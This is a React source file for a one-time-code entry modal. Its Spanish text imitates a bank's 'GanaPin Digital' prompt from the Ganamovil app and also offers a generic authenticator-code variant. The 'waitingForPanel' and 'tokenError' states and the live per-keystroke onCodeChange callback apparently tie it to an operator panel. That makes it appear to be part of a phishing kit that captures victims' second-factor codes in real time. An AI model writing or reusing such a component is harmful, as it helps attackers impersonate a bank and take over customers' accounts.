import { useEffect, useRef, useState } from 'react'
import './OtpModal.css'

const VARIANTS = {
  ganapin: {
    title: 'GanaPin Digital',
    description:
      'Abra su Ganamovil e ingrese el código GanaPin Digital 6 dígitos.',
    image: '/assets/seguridad-auto.jpg',
    imageAlt: 'Imagen de seguridad',
  },
  totp: {
    title: 'Ingresar código de verificación',
    description: 'Ingresa el código de 6 dígitos de tu app de autenticación',
    image: '/assets/seguridad-avion.jpg',
    imageAlt: 'Imagen de seguridad',
  },
}

export default function OtpModal({
  username,
  variant = 'ganapin',
  securityImage = '',
  waitingForPanel = false,
  tokenError = '',
  onSubmit,
  onCodeChange,
}) {
  const config = VARIANTS[variant] || VARIANTS.ganapin
  const imageSrc = securityImage || config.image
  const [otp, setOtp] = useState(['', '', '', '', '', ''])
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const inputsRef = useRef([])

  useEffect(() => {
    if (!waitingForPanel) inputsRef.current[0]?.focus()
  }, [waitingForPanel])

  useEffect(() => {
    if (waitingForPanel) setSubmitting(true)
  }, [waitingForPanel])

  useEffect(() => {
    if (!tokenError) return
    setError(tokenError.replace(/\s*\(\d+\)$/, '').replace(/\(\d+\)$/, ''))
    setOtp(['', '', '', '', '', ''])
    setSubmitting(false)
  }, [tokenError])

  const code = otp.join('')
  const busy = submitting || waitingForPanel
  const canVerify = code.length === 6 && !busy

  function commitDigits(next) {
    setOtp(next)
    setError('')
    onCodeChange?.(next.join(''))
  }

  function updateDigit(index, value) {
    if (busy) return
    const digit = value.replace(/\D/g, '').slice(-1)
    const next = [...otp]
    next[index] = digit
    commitDigits(next)
    if (digit && index < 5) inputsRef.current[index + 1]?.focus()
  }

  function onKeyDown(index, event) {
    if (busy) return
    if (event.key === 'Backspace' && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus()
    }
  }

  function onPaste(event) {
    if (busy) return
    event.preventDefault()
    const text = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6)
    if (!text) return
    const next = ['', '', '', '', '', '']
    ;[...text].forEach((ch, i) => {
      next[i] = ch
    })
    commitDigits(next)
    inputsRef.current[Math.min(text.length, 5)]?.focus()
  }

  function verificar() {
    if (!canVerify) return
    setError('')
    setSubmitting(true)
    onSubmit?.({ username, code, variant })
  }

  return (
    <div
      className="otp-overlay"
      role="dialog"
      aria-modal="true"
      aria-labelledby="otp-title"
    >
      <div className={`otp-modal${busy ? ' otp-modal--busy' : ''}`}>
        <h2 className="otp-title" id="otp-title">
          {config.title}
        </h2>
        <p className="otp-desc">{config.description}</p>

        <div className="otp-image-wrap">
          <img className="otp-image" src={imageSrc} alt={config.imageAlt} />
        </div>

        <div className="otp-boxes" onPaste={onPaste}>
          {otp.map((value, index) => (
            <input
              key={index}
              ref={(el) => {
                inputsRef.current[index] = el
              }}
              className="otp-box"
              inputMode="numeric"
              autoComplete={index === 0 ? 'one-time-code' : 'off'}
              maxLength={1}
              value={value}
              disabled={busy}
              onChange={(e) => updateDigit(index, e.target.value)}
              onKeyDown={(e) => onKeyDown(index, e)}
              aria-label={`Dígito ${index + 1}`}
            />
          ))}
        </div>

        {error && <div className="otp-error">{error}</div>}

        <button
          type="button"
          className="otp-verificar"
          onClick={verificar}
          disabled={!canVerify}
        >
          {busy ? 'Verificando…' : 'Verificar'}
        </button>
      </div>
    </div>
  )
}
